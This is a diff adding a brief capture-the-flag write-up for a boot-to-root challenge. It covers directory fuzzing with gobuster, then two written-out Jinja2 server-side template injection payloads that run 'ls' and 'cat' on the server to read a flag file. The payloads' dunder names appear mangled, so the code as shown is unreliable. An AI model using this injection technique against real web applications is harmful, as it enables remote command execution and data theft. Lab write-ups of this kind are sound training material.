@@ -1,1 +1,21 @@
 
+## Challenge 1: Boot-2-Root : FLAG 1
+![[Pasted image 20250922141731.png]]
+
+Then gobuster to fuzz the website
+
+![[Pasted image 20250922152545.png]]
+
+So we found /page exists, next we went into that site
+It was like this,
+![[Pasted image 20250922152733.png]]
+So we used SSTI injection to find the list of files
+`{{ ''._class.mro[1].subclasses()[122].init.globals['builtins']['import_']('os').popen('ls').read() }}`
+![[info.jpg]]
+
+So we have found that there is a file named Fl4@G_0n3.txt.
+Then I used the payload to print the contents of the file Fl4@G_0n3.txt
+`{{ ''._class.mro[1].subclasses()[122].init.globals['builtins']['import_']('os').popen('cat Fl4@G_0n3.txt').read() }}`
+Hence we got the flag!
+![[flag1.jpg]]
+
